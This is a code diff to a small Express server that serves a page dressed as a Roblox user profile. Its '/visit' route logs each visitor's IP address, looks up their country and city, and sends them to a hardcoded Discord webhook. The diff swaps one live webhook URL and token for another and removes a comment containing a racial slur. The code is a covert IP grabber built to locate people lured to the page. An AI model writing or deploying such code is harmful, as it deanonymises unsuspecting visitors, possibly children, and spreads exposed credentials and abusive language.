@@ -2,6 +2,7 @@ const express = require('express');
 const app = express();
 const fetch = require('node-fetch');
 
+
 app.get('/roll-dice', (req, res) => {
     const roll = Math.floor(Math.random() * 6) + 1;
     res.send(`You rolled a ${roll}`);
@@ -58,7 +59,6 @@ app.get('/', (req, res) => {
         <p>アルモシュ is one of the millions creating and exploring the endless possibilities of Roblox. Join アルモシュ on Roblox and explore together!</p>
     </div>
     <script>
-    // Animated network background
     const canvas = document.getElementById('bg');
     const ctx = canvas.getContext('2d');
     let w, h;
@@ -76,7 +76,6 @@ app.get('/', (req, res) => {
     }));
     function draw() {
         ctx.clearRect(0, 0, w, h);
-        // Draw lines
         for (let i = 0; i < dots.length; i++) {
             for (let j = i + 1; j < dots.length; j++) {
                 const dx = dots[i].x - dots[j].x;
@@ -92,7 +91,6 @@ app.get('/', (req, res) => {
                 }
             }
         }
-        // Draw dots
         for (const dot of dots) {
             ctx.beginPath();
             ctx.arc(dot.x, dot.y, 3, 0, 2 * Math.PI);
@@ -102,7 +100,6 @@ app.get('/', (req, res) => {
             ctx.fill();
             ctx.shadowBlur = 0;
         }
-        // Move dots
         for (const dot of dots) {
             dot.x += dot.vx;
             dot.y += dot.vy;
@@ -125,8 +122,11 @@ app.get('/visit', async (req, res) => {
         const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
         geo = await geoRes.json();
     } catch (e) {}
-    const countryFlag = geo.countryCode ? String.fromCodePoint(...[...geo.countryCode.toUpperCase()].map(c=>0x1F1E6-65+c.charCodeAt())) : '';
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1368048810349035581/73dqwwoV7V-eSYQTxgHHRFRXCr76NiZXE9WEbhFTnMqAzrDscBiOfbFU4UO8Kc-02IPL'; // i know you see this dont even try to spam this nigger gtfo
+    const countryFlag = geo.countryCode ? String.fromCodePoint(...[...geo.countryCode.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt())) : '';
+    
+    
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn';
+    
     const payload = {
         username: 'Visit Notifier - Exiled',
         embeds: [{
@@ -135,17 +135,22 @@ app.get('/visit', async (req, res) => {
             description: `IP: **${ip}** 🌍\nCountry: **${geo.country}** ${countryFlag}\nCity: **${geo.city}** 🏙️`
         }]
     };
+    
     try {
         await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-    } catch (e) {}
+    } catch (e) {
+        console.error('Failed to send webhook:', e);
+    }
     res.send(`<h2>Logged!</h2>`);
 });
 
+// Start the server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log('Server running on port ' + PORT);
 });
+
